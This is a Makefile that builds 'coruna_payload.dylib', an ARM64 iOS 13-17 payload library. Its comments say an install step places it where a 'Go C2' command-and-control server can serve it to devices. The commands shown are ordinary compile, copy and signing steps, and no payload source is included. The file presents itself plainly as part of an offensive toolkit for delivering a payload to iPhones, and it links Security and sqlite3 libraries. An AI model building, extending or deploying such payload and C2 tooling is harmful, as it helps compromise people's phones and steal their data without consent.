# ────────────────────────────────────────────────────────────────────────────
# Coruna iOS 13-17 payload dylib — cross-compilation Makefile
#
# Requirements (macOS only):
#   • Xcode + iOS SDK  (xcode-select --install)
#   • Apple Developer account (for ad-hoc codesign on device; simulator skips)
#
# Usage:
#   make          → build coruna_payload.dylib (ARM64 iOS)
#   make install  → copy to ../code..dylib  (Go C2 serve path)
#   make clean    → remove build artefacts
# ────────────────────────────────────────────────────────────────────────────

CC      = clang
ARCH    = arm64
SDK     = $(shell xcrun --sdk iphoneos --show-sdk-path 2>/dev/null)
MIN_IOS = 13.0
TARGET  = coruna_payload.dylib

# All .c files are compiled as Objective-C (they use #import / @autoreleasepool)
CFLAGS = \
	-arch $(ARCH) \
	-isysroot $(SDK) \
	-miphoneos-version-min=$(MIN_IOS) \
	-x objective-c \
	-fobjc-arc \
	-Iinclude \
	-fvisibility=hidden \
	-O2 \
	-Wall

LDFLAGS = \
	-dynamiclib \
	-arch $(ARCH) \
	-isysroot $(SDK) \
	-miphoneos-version-min=$(MIN_IOS) \
	-framework Foundation \
	-framework Security \
	-lsqlite3

SRC = $(wildcard src/*.c)
OBJ = $(SRC:.c=.o)

# ── Build ────────────────────────────────────────────────────────────────────
all: check_sdk $(TARGET)

check_sdk:
	@if [ -z "$(SDK)" ]; then \
	    echo "ERROR: iOS SDK not found. Run on macOS with Xcode installed."; \
	    exit 1; \
	fi
	@echo "Using iOS SDK: $(SDK)"

$(TARGET): $(OBJ)
	$(CC) $(LDFLAGS) -o $@ $^
	@echo "Built: $@"

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

# ── Install to Go C2 payload directory ───────────────────────────────────────
# Copies the compiled dylib to payloads/ios1317/code..dylib
# so the Go server can serve it at /code..dylib
install: $(TARGET)
	cp $(TARGET) ../code..dylib
	@echo "Installed → ../code..dylib"

# ── Ad-hoc codesign (optional, for testing without provisioning) ──────────────
sign: $(TARGET)
	codesign --force --sign - $(TARGET)
	@echo "Ad-hoc signed: $(TARGET)"

clean:
	rm -f $(OBJ) $(TARGET)
